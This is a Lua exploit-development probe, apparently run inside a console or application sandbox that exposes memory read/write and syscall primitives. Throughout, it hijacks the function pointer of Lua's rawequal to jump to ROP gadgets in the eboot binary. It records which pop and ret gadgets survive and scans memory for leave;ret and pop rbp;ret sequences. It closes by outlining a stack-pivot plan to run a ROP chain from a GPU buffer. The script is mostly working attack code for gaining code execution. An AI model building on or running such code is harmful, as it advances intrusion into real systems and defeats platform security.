-- CRASH_CLASS: MODERATE
-- PROBE 123e: Single gadget tests — one per connection
--
-- 123d showed bare ret has non-zero eax residual, corrupting output.
-- Only xor eax,eax;ret is clean. Solution: test each gadget with
-- a WRAPPER — call gadget, then immediately call xor eax,eax;ret
-- to reset eax before Lua reads nresults.
--
-- Wait — we can't chain in one call. But we CAN use TWO CClosure
-- functions: redirect rawequal to the test gadget, redirect rawget
-- to xor eax,eax;ret. Call rawequal first (clobbers output), then
-- call rawget (xor eax,eax;ret — clean return). Check if rawequal
-- and rawget are both still functional.
--
-- ACTUALLY: simpler approach. For each pop gadget, we only care
-- about ONE BIT of information: did pcall return true or false?
-- We can detect this without reading the garbled return values.
-- Just use pcall and check ok, then print AFTER restoring.

print("=== PROBE 123e: SINGLE GADGET SURVIVAL TESTS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function get_eboot_base()
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc_info = make_syscall(593)
    pcall(function() sc_info(uint64(0), info) end)
    local lo = safe_rd(info + 0x108)
    local hi = safe_rd(info + 0x10C)
    if lo and hi then
        return uint64(string.format("0x%X%08X", hi, lo)), hi, lo
    end
    return nil, 0, 0
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

local function eboot_g(ehi, elo, offset)
    local lo = elo + offset
    local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

collectgarbage("stop")

local eboot_base, eboot_hi, eboot_lo = get_eboot_base()
local rawequal_addr = parse_func_addr(rawequal)
local rawget_addr = parse_func_addr(rawget)

print("[*] eboot base: " .. fmt_addr(eboot_base))
print("[*] rawequal:   " .. fmt_addr(rawequal_addr))
print("[*] rawget:     " .. fmt_addr(rawget_addr))

if not eboot_base or not rawequal_addr or not rawget_addr then
    print("ABORT")
    return
end

local re_orig_lo = safe_rd(rawequal_addr + 0x20)
local re_orig_hi = safe_rd(rawequal_addr + 0x24)

local G = {
    xor_eax_ret  = 0x471,
    ret_only     = 0x42,
    pop_rax_ret  = 0x992,
    pop_rcx_ret  = 0xE64,
    pop_rsi_ret  = 0xD77D,
    pop_rdi_ret  = 0xC9DFE,
    pop_rdx_ret  = 0x3B02D7,
}

-- Baseline
local glo, ghi = eboot_g(eboot_hi, eboot_lo, G.xor_eax_ret)
memory.write_dword(rawequal_addr + 0x20, glo)
memory.write_dword(rawequal_addr + 0x24, ghi)
local ok0, r0 = pcall(rawequal, 1, 1)
memory.write_dword(rawequal_addr + 0x20, re_orig_lo)
memory.write_dword(rawequal_addr + 0x24, re_orig_hi)
print(string.format("[*] baseline xor eax,eax;ret: ok=%s r1=%s%s",
    tostring(ok0), tostring(r0),
    (ok0 and r1 == nil) and " OK" or (ok0 and " OK" or " FAIL")))
if not ok0 then print("ABORT") return end

-- Test each gadget. After the pcall (which may garble output),
-- we restore and check rawequal. The key is: we DON'T print
-- between redirect and restore. We save the result and print after.
print("")
print("--- GADGET SURVIVAL TESTS ---")
print("Format: gadget → pcall_ok, post_restore_check")
print("")

local tests = {
    {"ret_only",    G.ret_only},
    {"pop_rcx",     G.pop_rcx_ret},
    {"pop_rsi",     G.pop_rsi_ret},
    {"pop_rdi",     G.pop_rdi_ret},
    {"pop_rdx",     G.pop_rdx_ret},
    {"pop_rax",     G.pop_rax_ret},
}

local results = {}

for _, test in ipairs(tests) do
    local name, offset = test[1], test[2]

    -- Redirect
    local tlo, thi = eboot_g(eboot_hi, eboot_lo, offset)
    memory.write_dword(rawequal_addr + 0x20, tlo)
    memory.write_dword(rawequal_addr + 0x24, thi)

    -- Call (may produce garbage output — we don't care)
    local ok_t = pcall(rawequal, 1, 1)

    -- Restore immediately
    memory.write_dword(rawequal_addr + 0x20, re_orig_lo)
    memory.write_dword(rawequal_addr + 0x24, re_orig_hi)

    -- Check if rawequal still works
    local check_ok, check_val = pcall(rawequal, 1, 1)
    local post_ok = check_ok and (check_val == true)

    results[#results + 1] = {name, ok_t, post_ok}
end

-- Now print all results cleanly (output stream should be fine now)
print("")
print("=== RESULTS ===")
for _, r in ipairs(results) do
    local name, survived, post_ok = r[1], r[2], r[3]
    local status
    if survived and post_ok then
        status = "SURVIVED + CLEAN"
    elseif survived and not post_ok then
        status = "SURVIVED but rawequal BROKEN"
    else
        status = "CRASHED"
    end
    print(string.format("  %-10s: pcall=%s post_restore=%s → %s",
        name, tostring(survived), tostring(post_ok), status))
end

-- Count survivors
local survived_count = 0
for _, r in ipairs(results) do
    if r[2] and r[3] then survived_count = survived_count + 1 end
end
print(string.format("\n[*] %d/%d gadgets survived cleanly", survived_count, #results))

if survived_count == #tests then
    print("[*] *** ALL POP GADGETS SURVIVE ***")
    print("[*] *** [rsp+8] is always a valid return address ***")
    print("[*] *** dispatch call frame = simple `call [fn]` ***")
    print("[*]")
    print("[*] CRITICAL IMPLICATION:")
    print("[*]   pop REG;ret pops the dispatch return addr into REG")
    print("[*]   Then rets to the CALLER's return addr (one frame up)")
    print("[*]   The caller handles cleanup → Lua continues normally")
    print("[*]   eax from the original function call determines nresults")
    print("[*]")
    print("[*]   We can clobber rdi, rsi, rdx, rcx, rax freely!")
    print("[*]   The dispatch caller restores everything it needs.")
end


-- =============================================
-- T10: leave;ret scan
-- =============================================
print("")
print("--- leave;ret scan ---")
local leave_first = nil
local leave_count = 0
for off = 0, 0x500000 - 4, 4 do
    local addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off))
    local dw = safe_rd(addr)
    if dw == nil then break end
    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    local b3 = math.floor(dw / 16777216) % 256
    if b0 == 0xC9 and b1 == 0xC3 then
        leave_count = leave_count + 1
        if leave_count <= 5 then print(string.format("  eboot+0x%X", off)) end
        if not leave_first then leave_first = off end
    end
    if b1 == 0xC9 and b2 == 0xC3 then
        leave_count = leave_count + 1
        if leave_count <= 5 then print(string.format("  eboot+0x%X", off+1)) end
        if not leave_first then leave_first = off+1 end
    end
    if b2 == 0xC9 and b3 == 0xC3 then
        leave_count = leave_count + 1
        if leave_count <= 5 then print(string.format("  eboot+0x%X", off+2)) end
        if not leave_first then leave_first = off+2 end
    end
end
print(string.format("[*] %d leave;ret gadgets found", leave_count))

-- pop rbp;ret = 5D C3
local pop_rbp_off = nil
for off = 0, 0x500000 - 4, 4 do
    local addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off))
    local dw = safe_rd(addr)
    if dw == nil then break end
    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    if b0 == 0x5D and b1 == 0xC3 then pop_rbp_off = off; break end
    if b1 == 0x5D and b2 == 0xC3 then pop_rbp_off = off+1; break end
end

if pop_rbp_off then
    print(string.format("[*] pop rbp;ret at eboot+0x%X", pop_rbp_off))

    -- Test survival
    local prb_lo, prb_hi = eboot_g(eboot_hi, eboot_lo, pop_rbp_off)
    memory.write_dword(rawequal_addr + 0x20, prb_lo)
    memory.write_dword(rawequal_addr + 0x24, prb_hi)
    local ok_rbp = pcall(rawequal, 1, 1)
    memory.write_dword(rawequal_addr + 0x20, re_orig_lo)
    memory.write_dword(rawequal_addr + 0x24, re_orig_hi)
    local check_rbp = rawequal(1, 1)

    print(string.format("[*] pop rbp;ret: survived=%s post_restore=%s",
        tostring(ok_rbp), tostring(check_rbp)))

    if ok_rbp and check_rbp == true then
        print("[*] *** pop rbp;ret SURVIVED + CLEAN ***")
        print("[*] *** rbp is callee-saved but dispatch doesn't depend on it ***")
        print("[*] *** STACK PIVOT CHAIN: pop rbp → leave;ret ***")
    end
end


-- =============================================
-- SUMMARY: STACK PIVOT FEASIBILITY
-- =============================================
print("")
print("=== STACK PIVOT ANALYSIS ===")
print("")
if leave_first and pop_rbp_off and survived_count == #tests then
    print("ALL PRIMITIVES AVAILABLE:")
    print(string.format("  pop rbp;ret   at eboot+0x%X", pop_rbp_off))
    print(string.format("  leave;ret     at eboot+0x%X", leave_first))
    print("  All pop gadgets survive + clean restore")
    print("")
    print("STACK PIVOT CHAIN:")
    print("  1. Write ROP chain to GPU mmap buffer")
    print("  2. Redirect rawequal → pop rbp;ret")
    print("     BUT: pop rbp gets the dispatch return addr, NOT our buffer!")
    print("     We need rbp = GPU_buffer_addr")
    print("")
    print("PROBLEM: pop rbp;ret pops [rsp+0] which is the dispatch return addr.")
    print("We need to WRITE our buffer addr onto the stack before pop rbp runs.")
    print("This requires either:")
    print("  a) A gadget that sets rbp from a register we control")
    print("  b) Writing to the stack directly (need stack addr)")
    print("  c) Using the CClosure upvalue mechanism to pass a value")
    print("")
    print("APPROACH c) IS PROMISING:")
    print("  CClosure +0x28 = first upvalue TValue (type + value)")
    print("  If we write GPU_buf_addr to +0x28 and find a gadget that")
    print("  reads from [rdi+0x28] into rbp, we have the pivot!")
    print("  Or: if the C function prologue reads upvalues into registers...")
end

print("")
print("=== PROBE 123e COMPLETE ===")
